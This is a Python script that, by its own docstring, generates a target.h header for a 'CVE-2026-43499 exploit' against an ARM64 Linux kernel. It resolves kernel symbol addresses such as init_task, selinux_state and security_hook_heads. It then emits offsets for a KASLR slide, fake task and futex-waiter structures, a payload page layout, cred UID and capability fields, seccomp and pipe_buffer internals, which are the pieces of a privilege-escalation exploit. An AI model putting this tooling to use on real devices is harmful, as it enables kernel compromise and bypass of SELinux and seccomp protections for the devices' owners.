#!/usr/bin/env python3
"""Generate target.h from symbols.txt for CVE-2026-43499 exploit."""

BASE = 0xffffffc008000000

TARGETS = {
    "init_task": None,
    "selinux_enforcing": None,
    "anon_pipe_buf_ops": None,
    "noop_llseek": None,
    "no_llseek": None,
    "configfs_read_iter": None,
    "configfs_bin_write_iter": None,
    "copy_splice_read": None,
    "ashmem_fops": None,
    "ashmem_misc_fops": None,
    "kmalloc_caches": None,
    "selinux_blob_sizes": None,
    "security_hook_heads": None,
    "empty_zero_page": None,
    "root_task_group": None,
    "init_uts_ns": None,
    "selinux_state": None,
    "kernel_read": None,
    "kernel_write": None,
    "generic_file_read_iter": None,
    "generic_file_write_iter": None,
    "simple_read_from_buffer": None,
    "simple_write_to_buffer": None,
    "pipe_read": None,
    "pipe_write": None,
    "nosteal_pipe_buf_ops": None,
    "init_net": None,
    "init_nsproxy": None,
    "random_boot_id_data": None,
}

ALIASES = {
    "selinux_enforcing": ["selinux_enforcing_boot"],
    "random_boot_id_data": ["sysctl_bootid"],
    "ashmem_misc_fops": ["ashmem_misc"],
    "copy_splice_read": ["generic_file_splice_read"],
}

def match_target(sym):
    for target in TARGETS:
        if TARGETS[target] is None:
            if sym == target:
                return target
            if target in ALIASES and sym in ALIASES[target]:
                return target
    return None

with open("symbols.txt", "r") as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) < 3:
            continue
        addr_str = parts[0]
        sym = parts[2]
        target = match_target(sym)
        if target:
            TARGETS[target] = int(addr_str, 16)

missing = [k for k, v in TARGETS.items() if v is None]
if missing:
    print(f"WARNING: Missing symbols: {missing}")

print(f"""#ifndef TARGET_H
#define TARGET_H

/* ================================================================
 * Target: generated from symbols.txt
 * Kernel: Linux (ARM64, KASLR enabled)
 * Base: {hex(BASE)}
 * ================================================================ */

#define KIMAGE_TEXT_BASE               0x{BASE:016x}ULL
#define P0_PAGE_OFFSET                 0xffffff8000000000ULL
#define P0_PHYS_OFFSET                 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD            0x80000000ULL
#define KERNELSNITCH_IDENTITY_START    0xffffff8080000000ULL
#define KERNELSNITCH_IDENTITY_END      0xffffff8380000000ULL
#define DIRECT_MAP_BASE                0xffffff8000000000ULL
#define DIRECT_MAP_END                 0xffffff9000000000ULL
#define VMEMMAP_START                  0xfffffffe00000000ULL

#define PAGE_SHIFT                     12
#define KS_PAGE_SIZE                   4096
#define KS_PAGE_MASK                   0xfffULL
""")

for name in sorted(TARGETS.keys()):
    if TARGETS[name] is not None:
        off = TARGETS[name] - BASE
        print(f"#define {name.upper()}_OFF 0x{off:08x}ULL")
        print(f"#define {name.upper()} (KIMAGE_TEXT_BASE + {name.upper()}_OFF)")
    else:
        print(f"// #define {name.upper()}_OFF 0x00000000ULL /* NOT FOUND */")
        print(f"// #define {name.upper()} (KIMAGE_TEXT_BASE + {name.upper()}_OFF)")

print(f"""
/* Slide / KASLR Bypass Offsets */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  RANDOM_BOOT_ID_DATA_OFF
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)

/* ================================================================
 * Payload Page Layout (from caiman)
 * ================================================================ */
#define LOCK_OFF                       0x1350
#define W0_OFF                         0x2220
#define FOPS_OFF                       0x1000
#define SCRATCH_OFF                    0x3000
#define RIGHT_OFF                      0x4440
#define LEFT_OFF                       0x5550
#define FAKE_TASK_OFF                  0x3200

/* ================================================================
 * Waiter / Futex Struct Offsets (from caiman)
 * ================================================================ */
#define WAITER_LOCAL_OFF               0x80
#define WAITER_TREE_ENTRY_OFF          0x00
#define WAITER_PI_TREE_ENTRY_OFF       0x18
#define WAITER_TASK_OFF                0x30
#define WAITER_LOCK_OFF                0x38
#define WAITER_WAKE_STATE_OFF          0x40
#define WAITER_PRIO_OFF                0x44
#define WAITER_DEADLINE_OFF            0x48
#define WAITER_WW_CTX_OFF              0x50

#define FAKE_WAITER_TREE_PRIO_OFF      0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF  0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF  0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF   0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF           0x50
#define FAKE_WAITER_LOCK_OFF           0x58
#define FAKE_WAITER_WAKE_STATE_OFF     0x60
#define FAKE_WAITER_WW_CTX_OFF         0x68

/* ================================================================
 * Task/struct offsets (from caiman 5.10, may need adjustment)
 * ================================================================ */
#define FAKE_TASK_USAGE_OFF            0x40
#define FAKE_TASK_PRIO_OFF             0x84
#define FAKE_TASK_NORMAL_PRIO_OFF      0x8c
#define FAKE_TASK_TASK_GROUP_OFF       0x348
#define FAKE_TASK_PI_LOCK_OFF          0x924
#define FAKE_TASK_PI_WAITERS_OFF       0x938
#define FAKE_TASK_PI_TOP_TASK_OFF      0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF    0x950

#define CFG_PAGE_OFF                   16
#define CFG_NEEDS_READ_FILL_OFF        80
#define CFG_BIN_BUFFER_OFF             88
#define CFG_BIN_BUFFER_SIZE_OFF        96
#define CFG_CB_MAX_SIZE_OFF            100

#define MM_OWNER_OFF                   1032
#define TASK_PID_OFF                   0x618
#define TASK_TGID_OFF                  0x61c
#define TASK_REAL_PARENT_OFF           0x628
#define TASK_ATOMIC_FLAGS_OFF          0x5d8
#define TASK_REAL_CRED_OFF             0x818
#define TASK_CRED_OFF                  0x820
#define TASK_COMM_OFF                  0x830
#define TASK_TASKS_OFF                 0x550
#define TASK_THREAD_INFO_FLAGS_OFF     0x00
#define TASK_SECCOMP_OFF               0x8e8

#define CRED_UID_OFF                   8
#define CRED_SECUREBITS_OFF            40
#define CRED_CAPS_OFF                  48
#define CRED_SECURITY_OFF              128
#define SELINUX_CRED_BLOB_OFF          0
#define SELINUX_CRED_OSID_OFF          0
#define SELINUX_CRED_SID_OFF           4

#define SECCOMP_MODE_OFF               0x00
#define SECCOMP_FILTER_COUNT_OFF       0x04
#define SECCOMP_FILTER_OFF             0x08
#define TIF_SECCOMP_BIT                11
#define PFA_NO_NEW_PRIVS_BIT           0

#define STRUCT_PAGE_SIZE               0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF  0x08
#define STRUCT_SLAB_CACHE_OFF          0x08
#define STRUCT_PAGE_TYPE_OFF           0x30

#define PIPE_BUFFER_SIZE               0x28
#define PIPE_BUFFER_SLOTS              32
#define PIPE_BUF_FLAG_CAN_MERGE        0x10
#define PIPE_INODE_INFO_STRUCT_SIZE    0xb8
#define PIPE_INODE_INFO_SIZE           0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                  0x60
#define PIPE_TAIL_OFF                  0x64
#define PIPE_MAX_USAGE_OFF             0x68
#define PIPE_RING_SIZE_OFF             0x6c
#define PIPE_NR_ACCOUNTED_OFF          0x70
#define PIPE_READERS_OFF               0x74
#define PIPE_WRITERS_OFF               0x78
#define PIPE_FILES_OFF                 0x7c
#define PIPE_TMP_PAGE_OFF              0x90
#define PIPE_BUFS_OFF                  0xa8
#define PIPE_USER_OFF                  0xb0

#define FOPS_OWNER_OFF                 0x00
#define FOPS_LLSEEK_OFF                0x08
#define FOPS_READ_OFF                  0x10
#define FOPS_WRITE_OFF                 0x18
#define FOPS_READ_ITER_OFF             0x20
#define FOPS_WRITE_ITER_OFF            0x28
#define FOPS_IOCTL_OFF                 0x50
#define FOPS_COMPAT_IOCTL_OFF          0x58
#define FOPS_MMAP_OFF                  0x60
#define FOPS_OPEN_OFF                  0x70
#define FOPS_RELEASE_OFF               0x80
#define FOPS_SPLICE_READ_OFF           0xc0
#define FOPS_SHOW_FDINFO_OFF           0xe0

#endif /* TARGET_H */
""")
